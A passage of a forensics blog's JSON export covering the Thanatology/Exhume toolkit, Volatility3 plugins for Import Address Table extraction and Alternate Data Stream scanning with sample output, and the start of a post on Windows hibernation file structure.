acquired?\\n-\\tHow was it processed or analyzed?\\n-\\tWhat does it mean?\\n-\\tCan this be independently verified and how?\\n\\nAlthough **education**, **experience**, and **expertise** are key to answer these questions, we felt that the need to have more control and transparency in the tool we use is critical.\\n\\nWith the intention to better understand what digital forensics tools are actually doing from scratch; I wanted to build my own tools. The trigger was during a criminology degree in 2024, I was introduced and dived deep inside the traditional medical forensics field and had the opportunity to witness how well the technical procedure is design for the study of the dead and the living. This gave me the motivation to create the \u201cThanatology\u201d project named after this discipline[^1] in an effort to create a framework that allows the digital investigator expert to be more rigorous by design.\\n\\n## What Is Thanatology?\\n\\nIn short, Thanatology is a modern and enhanced digital forensics Desktop Application which is cross-platform using the power of the Tauri framework.\\n\\nIt is built on top of the [**Exhume tool suite**](https://www.forensicxlab.com/docs/exhume) (or toolkit). The exhume tool suite is a set of command line and libraries written in rust from scratch to parse data from different digital sources and formats to extract artifacts. There is nothing new to the approach, the sleuthkit[^2] is built around a similar philosophy.\\n\\nThe difference here is that I wanted to use the powerful capabilities of the rust language to produce an alternative and perhaps more modern approach to propose as many digital forensics features as possible like disk image forensics, memory forensics, malware analysis and, in time, Artificial Intelligence features.\\n\\nIt also allows me to compare my results with well-established tools and challenge myself technically. I could already witness during my journey some inconsistencies in some well-known and widely used tools that will be detailed in later blog posts. In short, rebuilding almost everything from scratch might sound time consuming and not interesting but it is worth it to learn new things and stimulate innovation.\\n\\n\\n## Design and architecture\\n\\nThe Thanatology project is built around 2 major components:\\n-\\tThe Exhume Tool Suite\\n-\\tThe Tauri Framework\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-1/Picture1.png\\" alt=\\"Thanatology architecture\\" />\\n    <figcaption><i>Thanatology architecture</i></figcaption>\\n</figure>\\n\\n\\n### The Exhume Tool suite\\n\\nThe [exhume tool suite](https://www.forensicxlab.com/docs/exhume) (named after the exhume[^3] terms in the discipline and the idea of bringing back from neglect or obscurity), is the foundation of the applications. Any digital forensics examiner can use the exhume tool suite as a command line to perform digital forensics investigation. Exhume is a hybrid tool suite, each tool can be used as a command line or as a library thus enabling any member of the community to write their own tools. Thanatology is just a Desktop application using the exhume tool suite as a library. **We will deep dive into exhume in the next blogpost of this series**.\\n\\n\\n### The Tauri Framework\\n\\n***Digital Forensics is a cross-platform discipline!***\\n\\nTauri is a modern framework for building cross-platform desktop applications using:\\n\\t- A Frontend: Web technologies (React, Vue, Svelte, etc.)\\n\\t- A Backend: Native Rust code\\n\\nIt allows developers to package their web-based UI as a lightweight, secure desktop application across Windows, Linux, and macOS. In our case, we choose the REACT MUI framework for the frontend.\\n\\nUnlike Electron (which bundles Chromium), Tauri uses the system\u2019s native webview (WebView2 on Windows, WKWebView on macOS, and WebKitGTK on Linux), making it much smaller and more secure.\\n\\nThere is many more advantages in using the tauri framework you can learn more [here](https://tauri.app/).\\n\\nIn the context of Thanatology, Tauri allows seamless reuse of the exhume tool suite code in the desktop app. This ensures high performance, memory safety, and low-level control without sacrificing UX.  We are using a local SQLite database for the first major release, but the goal is to have an hybrid approach where the use can choose between a local or remote database, enabling collaboration.\\n\\n\\n## State of the art\\n\\nThanatology is in its development phase, it is evolving in parallel of the Exhume toolsuite, exhume being the library which the projects is relying up on. We are starting with traditional disk forensics and currently have made several millstones described below.\\n\\n### Basic case & evidence management\\n\\nIn Thanatology, a case is a set of evidence. The investigator can create a case and add one or multiple evidence linked to the created case. The type of evidence supported is currently only \u201cdisk image\u201d which can be a logical or physical acquisition.\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-1/Picture2.png\\" alt=\\"Thanatology evidence selection view\\" />\\n    <figcaption><i>Thanatology evidence selection view</i></figcaption>\\n</figure>\\n\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-1/Picture3.png\\" alt=\\"Thanatology case summary view\\" />\\n    <figcaption><i>Thanatology case summary view</i></figcaption>\\n</figure>\\n\\n### MBR & GPT Partition Discovery\\n\\nOnce the evidence is selected, the preprocessing of the evidence can begin. The preprocessing phase is meant for the investigator to choose what he wants to analyze. It is important in the case of disk forensics for example that the investigator knows exactly what was discovered and that the action can be replicated with the exhume tool kit command line. You can see below the difference between discovering partitions in the Exhume toolkit with the CLI versus the output produced in the desktop application. That show how interlinked the twos are. Our philosophy is: \u201c***What you can see in the Desktop application can be recovered using the CLI***\u201d.\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-1/Picture4.png\\" alt=\\"Thanatology partition discovery view\\" />\\n    <figcaption><i>Thanatology partition discovery view</i></figcaption>\\n</figure>\\n\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-1/Picture5.png\\" alt=\\"Exhume partition discovery view\\" />\\n    <figcaption><i>Exhume partition discovery view</i></figcaption>\\n</figure>\\n\\n\\nThe investigator can choose which partitions he wishes to analyze. Thanatology is transparent and will inform the investigator if it is not capable of parsing some types of partitions. In the example below, we selected the Linux/GNU partition, which is recognized by Exhume, however the swap partition is not yet supported by any modules, thus indicating this information to the user. We plan to add the capability to choose which investigation modules to run in the processing phase so the investigator can disable or enable some modules depending on the context.\\n\\n\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-1/Picture6.png\\" alt=\\"Exhume partition discovery view\\" />\\n    <figcaption><i>Thanatology partition discovery view</i></figcaption>\\n</figure>\\n\\n\\n### Basic ExtFS and NTFS file indexing\\n\\nThe next step after the **preprocessing** phase is the processing phase. This is where the investigator will start the processing of the evidence. We build a basic file discovery module to index each file inside the local database. We have implemented a filesystem normalization system in exhume. This system is inherited by Thanatology. The advantage is that we can build the Exhume tool suite with the Thanatology application in mind to guide us.\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-1/Picture10.png\\" alt=\\"Thanatology Processing\\" />\\n    <figcaption><i>Thanatology Processing basic view</i></figcaption>\\n</figure>\\n\\n\\n### Investigating the evidence\\n\\nWhen the processing is done, the last stage is to review it to perform our digital investigation. The current design is only for demonstration purpose and will evolve in time but here is a sneak peak into the features we would like to provide for the first release:\\n-\\t**Artifacts category navigation**: Preselect some known artifacts base on the digital forensic community.\\n-\\t**Simple and deep file introspection**: We are developing our own \u201cAdvanced File Viewer\u201d to introspect files in real time.\\n-\\t**Agnostic shell integration**: Many investigators like to use the command line to run their own tools or the Exhume toolkit as a command line in the evidence they are investigating. We are integrating the capability to pop shells in Thanatology like you would in visual studio code for example.\\n-\\t**Whiteboard**: The investigator can keep track of the story he is building around the case using the Whiteboard which is based on [excalidraw](https://plus.excalidraw.com/).\\n\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-1/Picture8.png\\" alt=\\"Exhume partition discovery view\\" />\\n    <figcaption><i>Thanatology basics artifacts categories</i></figcaption>\\n</figure>\\n\\n\\n<figure style={{ border: \'1px solid #888\', padding: 20 }}>\\n    <img src=\\"/img/thanatology-1/Picture9.png\\" alt=\\"Exhume partition discovery view\\" />\\n    <figcaption><i>Thanatology Advanced file Viewer</i></figcaption>\\n</figure>\\n\\n\\n## Conclusion\\n\\nThis blogpost was about presenting a high-level vision of the project. In the future blogpost of the series, we will dive deep into the Exhume Tool Suite, exploring the most important existing modules and how to use them. Many blogposts will follow to update on the state of the Thanatology development. We have many ideas, but this is a side project so if you want to get involved into this project, we have created a Discord Community Server that you can join using the following [link](https://discord.com/invite/AqkYgR5HEg).\\n\\n\\n[^1]: https://en.wikipedia.org/wiki/Thanatology\\n[^2]: https://en.wikipedia.org/wiki/The_Sleuth_Kit\\n[^3]: https://en.wikipedia.org/wiki/Burial#Exhumation"},{"id":"voliat","metadata":{"permalink":"/blog/voliat","source":"@site/blog/2023-12-16-voliat/index.md","title":"\ud83d\udce6 Volatility3 : Import Address Table","description":"Windows executable analysis is a key aspect of Digital Forensics and Reverse Malware Engineering. Identifying the capabilities of a program can help to target potential malicious code and orient the later reverse code analysis phase. In this blogpost, we will dive into the structure of the Windows Portable Executable (PE) and how we can extract the imported functions in the context of memory analysis.","date":"2023-12-16T00:00:00.000Z","tags":[{"inline":true,"label":"DFIR","permalink":"/blog/tags/dfir"},{"inline":true,"label":"Volatility","permalink":"/blog/tags/volatility"},{"inline":true,"label":"Memory Forensics","permalink":"/blog/tags/memory-forensics"},{"inline":true,"label":"Windows","permalink":"/blog/tags/windows"}],"readingTime":4.89,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"voliat","title":"\ud83d\udce6 Volatility3 : Import Address Table","authors":["k1nd0ne"],"tags":["DFIR","Volatility","Memory Forensics","Windows"]},"unlisted":false,"prevItem":{"title":"\ud83e\udd89 Thanatology Part 1 - Introducing the Thanatology project","permalink":"/blog/thanatology"},"nextItem":{"title":"\ud83d\udce6 Volatility3 : Alternate Data Stream Scan","permalink":"/blog/volads"}},"content":"Windows executable analysis is a key aspect of Digital Forensics and Reverse Malware Engineering. Identifying the capabilities of a program can help to target potential malicious code and orient the later reverse code analysis phase. In this blogpost, we will dive into the structure of the Windows Portable Executable (PE) and how we can extract the imported functions in the context of memory analysis.\\n\\n\\n\x3c!-- truncate --\x3e\\n\\n\\n\\n## Windows PE Format\\n\\nA portable executable (PE) [^1] is a file format used by Windows to store executable programs, libraries (DLLs) and object files. It contains all the necessary information for the operating system to load and execute the program. The program is therefore well structured. Here is a representation of the PE structure for a Windows system [^2]:\\n\\n![alt text](../images/iat/1.png \\"PE Structure (simplified)\\")\\n\\n\\n\\nThe PE starts with the well-known DOS, Stub and NT headers. It is also composed of multiple sections. Each section as its own purpose, for example the .text section contains the byte codes corresponding to the instructions of the program. We will see that there are specific sections that exists which might help the analyst to identify the capabilities of an executable without starting the reverse code analysis phase. If you want to learn more about the PE format, the articles from 0xRick about the subject are very well explained [^2].\\n\\n### Interactions with the memory\\n\\nIn the context of memory analysis, we need to understand what is happening when a Windows executable is loaded. The operating system will map the PE file from the disk to memory by first creating a dedicated virtual address space. Then, the headers are parsed and loaded to learn about important information about the sections (entry point, size, ...). Once parsed, the memory allocation is performed to load the actual content of the sections. The PE file often depends on external libraries, the operating system resolves the imports by looking up the required functions in the corresponding DLLs and update the memory addresses accordingly. A library can be \u201cbound\u201d to the PE which means it is directly integrated inside the code section. This is often used for better performances.\\n\\n### The Import Address Table (IAT)\\n\\nThe Import Address Table is located inside the \u201c.idata\u201d Section [^3] of a PE, it can be seen as a table of references indicating to the loader which functions are needed from the imported DLL by the program. This table is a copy of the Import Lookup Table (ILT), but once in memory, the IAT is overwritten with the actual addresses of the functions that are being imported which is interesting from the memory forensics standpoint.\\n\\n## Extracting the IAT using volatility3\\n\\nCarving the IAT during memory forensics can be very valuable for the analyst to look for API call patterns associated with malware behavior. For example, the OpenProcess, VirtualAllocEx, CreateRemoteThread function present inside the IAT of a PE can be a good indicator for potential code injection [^4]. The analyst can also pivot on some of the functions to identify for example the arguments that can be passed.\\n\\nA volatility3 plugin can be made to extract the IAT information from the memory. Below is an example output of the created plugin named \u201cwindows.iat.IAT\u201d. For each process, the associated PE sections are parsed in order to find the IAT. Next, all of the imported functions are displayed to the analyst as well as if the associated DLL is bounded or not to the executable.\\n\\n```bash\\n~\xbb vol -r pretty -f Triage-Memory.mem windows.iat --pid 3496\\nVolatility 3 Framework 2.5.1\\nFormatting...0.00               PDB scanning finished\\n  |  PID |           Name |      Library | Bound |                        Function |  Address\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                            _iob | 0x80c0c8\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                _except_handler3 | 0x80c0cc\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                  __set_app_type | 0x80c0d0\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                      __p__fmode | 0x80c0d4\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                    __p__commode | 0x80c0d8\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                    _adjust_fdiv | 0x80c0dc\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                __setusermatherr | 0x80c0e0\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                       _initterm | 0x80c0e4\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                   __getmainargs | 0x80c0e8\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                   __p___initenv | 0x80c0ec\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                     _XcptFilter | 0x80c0f0\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                           _exit | 0x80c0f4\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                         _onexit | 0x80c0f8\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                     __dllonexit | 0x80c0fc\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                         strrchr | 0x80c100\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                         wcsncmp | 0x80c104\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                          _close | 0x80c108\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                          wcslen | 0x80c10c\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                          wcscpy | 0x80c110\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                        strerror | 0x80c114\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                            modf | 0x80c118\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                          strspn | 0x80c11c\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                         realloc | 0x80c120\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                    __p__environ | 0x80c124\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                   __p__wenviron | 0x80c128\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                          _errno | 0x80c12c\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                            free | 0x80c130\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                         strncmp | 0x80c134\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                          strstr | 0x80c138\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                         strncpy | 0x80c13c\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                           _ftol | 0x80c140\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                           qsort | 0x80c144\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                           fopen | 0x80c148\\n* | 3496 | UWkpjFjDzM.exe |   MSVCRT.dll | False |                          perror | 0x80c14c\\n[TRUNCATED]\\n```\\n\\n## Conclusion\\n\\nThe extraction of the IAT can be very useful for the analyst to identify the capabilities of a process in memory and gather context to better orient the reverse code analysis phase. When the analyst is willing to understand some of the Windows API functions, the Microsoft documentation is often explaining everything [^5]. Trying to look for some of the functions in the text section and extracting the value of the arguments can be the subject of a future blogpost. The pluging is available here and a pull request is in progress https://github.com/forensicxlab/volatility3/tree/feature/IAT\\n\\n> Do not hesitate to reach me at felix.guyard@forensicxlab.com to enhance this article or to comment on the integration to the volatility framework.\\n\\n[^1]: https://learn.microsoft.com/en-us/windows/win32/debug/pe-format\\n[^2]: https://0xrick.github.io/win-internals/pe2/#dos-header\\n[^3]: https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#import-address-table\\n[^4]: https://www.apriorit.com/dev-blog/679-windows-dll-injection-for-api-hooks\\n[^5]: https://learn.microsoft.com/en-us/windows/win32/api/"},{"id":"volads","metadata":{"permalink":"/blog/volads","source":"@site/blog/2023-11-18-volads/index.md","title":"\ud83d\udce6 Volatility3 : Alternate Data Stream Scan","description":"Windows executable analysis is a key aspect of Digital Forensics and Reverse Malware Engineering. Identifying the capabilities of a program can help to target potential malicious code and orient the later reverse code analysis phase. In this blogpost, we will dive into the structure of the Windows Portable Executable (PE) and how we can extract the imported functions in the context of memory analysis.","date":"2023-11-18T00:00:00.000Z","tags":[{"inline":true,"label":"DFIR","permalink":"/blog/tags/dfir"},{"inline":true,"label":"Volatility","permalink":"/blog/tags/volatility"},{"inline":true,"label":"Memory Forensics","permalink":"/blog/tags/memory-forensics"}],"readingTime":5.42,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"volads","title":"\ud83d\udce6 Volatility3 : Alternate Data Stream Scan","authors":["k1nd0ne"],"tags":["DFIR","Volatility","Memory Forensics"]},"unlisted":false,"prevItem":{"title":"\ud83d\udce6 Volatility3 : Import Address Table","permalink":"/blog/voliat"},"nextItem":{"title":"\ud83d\udcd8 Volatility3: Modern Windows Hibernation file analysis","permalink":"/blog/hibernation"}},"content":"Windows executable analysis is a key aspect of Digital Forensics and Reverse Malware Engineering. Identifying the capabilities of a program can help to target potential malicious code and orient the later reverse code analysis phase. In this blogpost, we will dive into the structure of the Windows Portable Executable (PE) and how we can extract the imported functions in the context of memory analysis.\\n\\n\x3c!-- truncate --\x3e\\n\\n\\n\\n## The Master File Table\\n\\nForensic analysts utilize the MFT extensively as it provides a wealth of information during investigations. Every file or directory in an NTFS volume holds an entry in the MFT. Each MFT entry, also known as a record. By examining the MFT, one can acquire valuable insights into a system\'s file activity, including deleted files or folders, timestamps, and access permissions. This information can be used to determine which files were created, accessed, modified, or deleted, and when these actions occurred for example.\\n\\n\\n### The MFT records\\n\\nMFT entries or records are typically 1,024 bytes in size and are divided into several fields. Here is a very nice representation by Jaked Atinkson of an MFT record.\\n\\n![alt text](../images/volads/mftfilerecord.png \\"MFT Record\\")\\n\\n\\n\\n\\n- **Header:** Holds information about the record itself, such as its address and links to other records.\\n\\n- **File Attributes:** Reveal crucial details about the file or directory, including its name, timestamp, size, and permission. File attributes may either be resident, meaning they are stored directly within the MFT record, or non-resident, indicating that they are stored elsewhere on the disk with only a reference in the MFT entry.\\n\\nThe **$DATA** attribute typically contains the actual contents of the file, the data can be **resident** or **non-resident**.\\n\\nA resident $DATA attribute means that the data is stored directly within the MFT record. This is usually the case for small files, where the data can fit within the record. The data will be stored directly in the MFT entry along with the metadata. Whereas a non-resident $DATA attribute is present when the file is too large for the record and therefore will contain a pointer to the location on the disk where the data is actually stored.\\n\\n### Alternate Data Streams (ADS)\\n\\nNTFS is providing a feature called **alternate data stream** (ADS). Used by Windows, it consists of another stream of data that can be attached to a file without changing its size or content.\\n\\n\\n![alt text](../images/volads/ads.gif \\"ADS\\")\\n\\n\\nOne example of usage of this feature by Microsoft is the **Zone.Identifier** ADS. It is employed by Internet Explorer and other Windows applications to identify where a file was downloaded from and from a potentially unsafe zone (like the internet). This artefact is known to be very useful for forensics investigators. But it was also seen in the wild that some threat actors are abusing the ADS to hide malicious payloads. The ADS can be detected by the fact that a given record is holding multiple $DATA attributes.\\n\\n## Creating a volatility3 plugin\\n\\n### The MFTScan plugin\\n\\nEven if the MFT entries are stored on disk, the latter also cached in memory, which motivated the creation of the \u201cMFTScan\u201d volatility3 plugin. This plugin is scanning for $STANDARD_INFORMATION and $FILE_NAME attributes providing a view of the files that were present in the volatile memory of the target system.\\n\\n\\n\\n```zsh\\n~\xbb ./vol.py -r pretty  -f Triage-Memory.mem  windows.mftscan.MFTScan\\nFormatting...0.00               PDB scanning finished\\nVolatility 3 Framework 2.5.1\\n   |         Offset | Record Type | Record Number | Link Count |  MFT Type |         Permissions |       Attribute Type |                     Created | ...|  Filename\\n*  | 0xf88004477450 |        FILE |        146309 |          2 | Directory |                 N/A | STANDARD_INFORMATION | 2019-03-21 15:47:00.000000  | ...| N/A\\n** | 0xf880044774b0 |        FILE |        146309 |          2 | Directory |                 0x0 |            FILE_NAME | 2019-03-21 15:47:00.000000  | ...| AM1080~1.175\\n*  | 0xf88004477850 |        FILE |        146310 |          2 |      File |                 N/A | STANDARD_INFORMATION | 2019-03-21 15:47:00.000000  | ...| N/A\\n** | 0xf880044778b0 |        FILE |        146310 |          2 |      File |             Archive |            FILE_NAME | 2019-03-21 15:47:00.000000  | ...| cfgmgr32.dll\\n** | 0xf88004477928 |        FILE |        146310 |          2 |      File |             Archive |            FILE_NAME | 2019-03-21 15:47:00.000000  | ...| cfgmgr32.dll\\n*  | 0xf88004477c50 |        FILE |        146311 |          2 | Directory |                 N/A | STANDARD_INFORMATION | 2019-03-21 15:47:00.000000  | ...| N/A\\n** | 0xf88004477cb0 |        FILE |        146311 |          2 | Directory |                 0x0 |            FILE_NAME | 2019-03-21 15:47:00.000000  | ...| AMEA70~1.175\\n```\\n\\n### The ADS plugin\\n\\nA new addition the capabilities of the MFT analysis in memory would be to scan for ADS inside the records looking for others $DATA attributes that are resident. This plugin was therefore created to detect ADS and extract the resident data to present it to the analyst. The output shows the file associated with the ADS found as well as a Hexdump and disassembled view. The latter could potentially help an analyst to identify a malicious code.\\n\\n####  Proof Of Concept\\n\\nThe  example below is showing the output of the plugin. We can see that the \u201cputty-64bit-0.70-installer.msi\u201d for example was downloaded from the internet (see ZoneID=3 in the hexdump column).\\n\\n\\n\\n```zsh\\n~\xbb ./vol.py -r pretty  -f Triage-Memory.mem  windows.mftscan.ADS\\nFormatting...0.00               PDB scanning finished\\nVolatility 3 Framework 2.5.1\\n  |         Offset | Record Type | Record Number | MFT Type |                      Filename |    ADS Filename |                          Hexdump |                                          Disasm\\n* | 0xf98001423650 |        FILE |         78477 |     DATA | putty-64bit-0.70-installer.msi | Zone.Identifier |                                  |\\n  |                |             |               |          |                               |                 | 5b 5a 6f 6e 65 54 72 61 [ZoneTra |                             0x0:    pop     rbx\\n  |                |             |               |          |                               |                 | 6e 73 66 65 72 5d 0d 0a nsfer].. |                             0x1:    pop     rdx\\n  |                |             |               |          |                               |                 | 5a 6f 6e 65 49 64 3d 33 ZoneId=3 |             0x2:    outsd   dx, dword ptr [rsi]\\n  |                |             |               |          |                               |                 |                                  |              0x3:    outsb   dx, byte ptr [rsi]\\n  |                |             |               |          |                               |                 |                                  |                             0x4:    push    rsp\\n  |                |             |               |          |                               |                 |                                  |                            0x6:    jb      0x69\\n  |                |             |               |          |                               |                 |                                  |              0x8:    outsb   dx, byte ptr [rsi]\\n  |                |             |               |          |                               |                 |                                  |                            0x9:    jae     0x71\\n  |                |             |               |          |                               |                 |                                  |                            0xb:    jb      0x6b\\n  |                |             |               |          |                               |                 |                                  |                 0xe:    or      eax, 0x6e6f5a0a\\n* | 0xf98001432e40 |        FILE |         78539 |     DATA | PackageManagement_x64.msi     | Zone.Identifier |                                  |\\n  |                |             |               |          |                               |                 | 5b 5a 6f 6e 65 54 72 61 [ZoneTra |                             0x0:    pop     rbx\\n  |                |             |               |          |                               |                 | 6e 73 66 65 72 5d 0d 0a nsfer].. |                             0x1:    pop     rdx\\n  |                |             |               |          |                               |                 | 5a 6f 6e 65 49 64 3d 33 ZoneId=3 |             0x2:    outsd   dx, dword ptr [rsi]\\n  |                |             |               |          |                               |                 |                                  |              0x3:    outsb   dx, byte ptr [rsi]\\n  |                |             |               |          |                               |                 |                                  |                             0x4:    push    rsp\\n  |                |             |               |          |                               |                 |                                  |                            0x6:    jb      0x69\\n  |                |             |               |          |                               |                 |                                  |              0x8:    outsb   dx, byte ptr [rsi]\\n  |                |             |               |          |                               |                 |                                  |                            0x9:    jae     0x71\\n  |                |             |               |          |                               |                 |                                  |                            0xb:    jb      0x6b\\n  |                |             |               |          |                               |                 |                                  |                 0xe:    or      eax, 0x6e6f5a0a\\n```\\n\\n\\n## Conclusion\\n\\nThe ability to scan for Alternate Data Stream is a good way to identify whether a file was downloaded from the internet or not. One can also identify malicious hidden data to help analysts upon an investigation to shed light onto the attack chain. The source code of this plugin can be found on Github: https://github.com/forensicxlab/volatility3/tree/feature/ADS, a pull request will be made to the volatility3 foundation for a potential integration to the framework.\\n\\n> Do not hesitate to reach me at felix.guyard@forensicxlab.com to enhance this article or to comment on the integration to the volatility framework."},{"id":"hibernation","metadata":{"permalink":"/blog/hibernation","source":"@site/blog/2023-10-27-hibernation/index.md","title":"\ud83d\udcd8 Volatility3: Modern Windows Hibernation file analysis","description":"In the Digital Forensics ecosystem, the field of memory forensics can help uncover artifacts that can\u2019t be found anywhere else. That can include deleted files, network connections, running processes, rootkits, code injection, fileless malware and many more.","date":"2023-10-27T00:00:00.000Z","tags":[{"inline":true,"label":"DFIR","permalink":"/blog/tags/dfir"},{"inline":true,"label":"Volatility","permalink":"/blog/tags/volatility"},{"inline":true,"label":"Memory Forensics","permalink":"/blog/tags/memory-forensics"},{"inline":true,"label":"Hibernation","permalink":"/blog/tags/hibernation"}],"readingTime":11.15,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"hibernation","title":"\ud83d\udcd8 Volatility3: Modern Windows Hibernation file analysis","authors":["k1nd0ne"],"tags":["DFIR","Volatility","Memory Forensics","Hibernation"]},"unlisted":false,"prevItem":{"title":"\ud83d\udce6 Volatility3 : Alternate Data Stream Scan","permalink":"/blog/volads"},"nextItem":{"title":"\ud83d\udcd8 Volatility3 - Remote analysis on cloud object-storage.","permalink":"/blog/vols3"}},"content":"In the Digital Forensics ecosystem, the field of memory forensics can help uncover artifacts that can\u2019t be found anywhere else. That can include deleted files, network connections, running processes, rootkits, code injection, fileless malware and many more.\\n\\nMicrosoft introduced the hibernation feature in Windows 2000, allowing systems to be powered down while preserving their volatile state. This is achieved by saving RAM contents and processor context to a file called hiberfil.sys before shutting down inside the root folder of the filesystem drive. When the computer is turned on again, the system restores the volatile state from the saved file. Hibernation files are valuable for digital forensic professionals as they store temporary data from RAM to non-volatile storage, eliminating the requirement for specialized tools on the target device.\\n\\nThe Hibernation file structure has evolved in time. In this blog post, we will dive into the structure of the modern Windows hibernation file and propose a new translation layer for the volatility3 framework to create a raw memory image from a hibernation file.\\n\\n\x3c!-- truncate --\x3e\\n\\n\\n## The structure of a modern hibernation file\\n\\nThe structure of the hibernation file can be divided into two variations:\\n\\n-\\tFrom Windows XP to Windows 7 (old)\\n-\\tFrom Windows 8 to Windows 11 (modern)\\n\\nThe following image represent the modern structure.\\n\\n![alt text](../images/hibernation/1.png \\"Structure\\")\\n\\nIn this blog post we will focus on the modern hibernation structure[^1], though you\u2019ll notice that the underlying principle remains the same which is to compress and store the physical memory pages of the hibernated system in specific data structures called \u201crestoration sets\u201d.\\n\u2003\\n### The file header\\n\\nThe hibernation files start with a header called PO_MEMORY_IMAGE. The structure of this header may differ slightly depending on the operating system version, but its definition is publicly available in the kernel\'s debugging symbols, which is very nice. The vergiliusproject[^2] gives us a nice description of this structure for each Windows version. Below is an example of the structure of the header.\\n\\n![alt text](../images/hibernation/2.png \\"Header\\")\\n\\n\\nThe signature of the file for an exploitable hibernation file is \u2018*HIBR*\u2019. The \u2018*RSTR*\u2019 signature indicates that the system is resuming from the file, making it apparently useless when this is the case. Valuable forensics artifacts are available like the system time when it was put into the hibernation state.\\n\\nNotice the \u201c**FirstBootRestorePage**\u201d and \u201c**FirstKernelRestorePage**\u201d attributes. Those values are storing the page number of the first restoration sets. Mutiplying those values by the size of a Windows x64 page (4096) we get the offset of the sections.\\n\\nWindows currently divide the storage of the memory pages in 2 locations :\\n-\\tThe boot section.\\n-\\tThe kernel section.\\n\\n>You might notice the \u201cSecureRestorePage\u201d section, however this value seems to be always 0 and there is no publicly available explanation on what those pages are used for. It might be used in the future though to encrypt memory pages so only the host machine can decrypt them via its TPM?\\n\\nTo know how many pages are stored for each sections the information can be retrieved from specific attributes:\\n\\n- \\"**NumPagesForLoader**\\": The number of pages in the \\"Boot\\" section\\n- \\"**PerfInfo->KernelPagesProcessed**\\": The number of pages in the \\"Kernel\\" section\\n\\nUnfortunately for us, the attribute storing the location and number of pages for the Kernel section did change with the Windows OS updates. Below is a table tracking those changes.\\n\\n| Windows Versions                              | FirstKernelRestorePage  offset    |    KernelPagesProcessed offset  |\\n| -------------------------------------------|:---------------------------------:|:----------------------:|\\n| Windows 8/8.1                             |               0x68                |\\t                0x1C8                  \\t |\\n| Windows 10 2016 1507-1511                 |               0x70                |\\t                0x218                  \\t |\\n| Windows 10 2016 1607                      |               0x70                |\\t                0x220                  \\t |\\n| Windows 10 2016 1703 - Windows 11 23H2     |              0x70                |\\t                0x230                  \\t |\\n\\n\\n\\n\\n\\n### The compression sets.\\n\\nA restoration set 